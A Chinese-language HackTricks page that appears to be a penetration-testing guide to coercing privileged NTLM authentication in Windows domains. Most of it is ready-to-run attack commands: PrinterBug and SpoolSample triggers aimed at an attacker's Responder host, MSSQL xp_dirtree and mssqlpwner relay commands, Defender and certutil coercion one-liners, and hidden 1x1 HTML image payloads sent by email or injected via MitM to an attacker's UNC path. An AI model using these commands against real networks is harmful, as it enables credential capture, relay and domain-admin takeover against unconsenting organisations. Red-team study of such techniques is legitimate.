# 强制 NTLM 特权认证

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个 **远程认证触发器的集合**，使用 C# 编写，采用 MIDL 编译器以避免第三方依赖。

## 打印机后台处理服务滥用

如果 _**打印后台处理程序**_ 服务 **已启用**，您可以使用一些已知的 AD 凭据向域控制器的打印服务器 **请求** 新打印作业的 **更新**，并告诉它 **将通知发送到某个系统**。\
请注意，当打印机将通知发送到任意系统时，它需要 **对该系统进行认证**。因此，攻击者可以使 _**打印后台处理程序**_ 服务对任意系统进行认证，而该服务将在此认证中 **使用计算机账户**。

### 在域中查找 Windows 服务器

使用 PowerShell 获取 Windows 计算机的列表。服务器通常是优先考虑的，因此我们将重点放在这里：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 查找监听的Spooler服务

使用稍微修改过的@mysmartlogin（Vincent Le Toux）的[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看Spooler服务是否在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
您还可以在Linux上使用rpcdump.py并查找MS-RPRN协议
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 请求服务对任意主机进行身份验证

您可以从这里编译[ **SpoolSample**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) 如果你在 Linux 上
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 结合不受限制的委托

如果攻击者已经攻陷了一台具有[不受限制的委托](unconstrained-delegation.md)的计算机，攻击者可以**使打印机对该计算机进行身份验证**。由于不受限制的委托，**打印机的计算机帐户的TGT**将被**保存在**具有不受限制委托的计算机的**内存**中。由于攻击者已经攻陷了该主机，他将能够**检索此票证**并加以利用（[Pass the Ticket](pass-the-ticket.md)）。

## RCP 强制身份验证

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻击是由于**Exchange Server `PushSubscription`功能**中的一个缺陷所导致的。该功能允许任何具有邮箱的域用户强制Exchange服务器通过HTTP对任何客户端提供的主机进行身份验证。

默认情况下，**Exchange服务以SYSTEM身份运行**，并被赋予过多的权限（具体来说，它在2019年之前的累积更新上具有**WriteDacl权限**）。这个缺陷可以被利用来启用**向LDAP中转信息并随后提取域NTDS数据库**。在无法向LDAP中转的情况下，这个缺陷仍然可以用于在域内中转和对其他主机进行身份验证。成功利用此攻击将立即授予任何经过身份验证的域用户帐户对域管理员的访问权限。

## 在Windows内部

如果您已经在Windows机器内部，可以使用以下命令强制Windows使用特权帐户连接到服务器：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
或使用这个其他技术: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（微软签名的二进制文件）来强制 NTLM 认证:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML 注入

### 通过电子邮件

如果你知道想要攻陷的机器上用户的 **电子邮件地址**，你可以直接给他发送一封 **带有 1x1 图像** 的电子邮件，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
和当他打开它时，他会尝试进行身份验证。

### MitM

如果你可以对一台计算机执行MitM攻击并在他可视化的页面中注入HTML，你可以尝试在页面中注入如下图像：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 破解 NTLMv1

如果你能捕获 [NTLMv1 挑战，请阅读如何破解它们](../ntlm/#ntlmv1-attack)。\
&#xNAN;_&#x52;记住，为了破解 NTLMv1，你需要将 Responder 挑战设置为 "1122334455667788"_

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
